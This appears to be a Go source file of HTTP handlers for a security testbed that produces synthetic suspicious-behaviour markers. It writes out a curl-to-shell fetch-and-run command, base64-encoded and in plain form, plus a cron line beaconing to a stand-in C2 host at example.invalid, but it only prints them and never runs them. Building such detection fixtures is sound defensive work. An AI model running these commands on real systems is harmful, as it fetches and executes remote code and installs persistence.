package handlers

import (
	"encoding/base64"
	"errors"
	"net/http"
	"os"
	"os/exec"
)

const safeToolURL = "https://example.invalid/synthetic-tool.bin"

var errUnsafeToolURL = errors.New("tool URL is not allowlisted")

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	if source != safeToolURL {
		writeClientError(w, r, http.StatusBadRequest, "validate tool URL", errUnsafeToolURL)
		return
	}

	out, err := os.CreateTemp("", "reach-testbed-tool-*.bin")
	if err != nil {
		writeClientError(w, r, http.StatusInternalServerError, "create staged tool", err)
		return
	}
	target := out.Name()
	if _, err := out.Write([]byte("synthetic local tool fixture\n")); err != nil {
		_ = out.Close()
		_ = os.Remove(target)
		writeClientError(w, r, http.StatusInternalServerError, "write staged tool", err)
		return
	}
	if err := out.Close(); err != nil {
		_ = os.Remove(target)
		writeClientError(w, r, http.StatusInternalServerError, "close staged tool", err)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
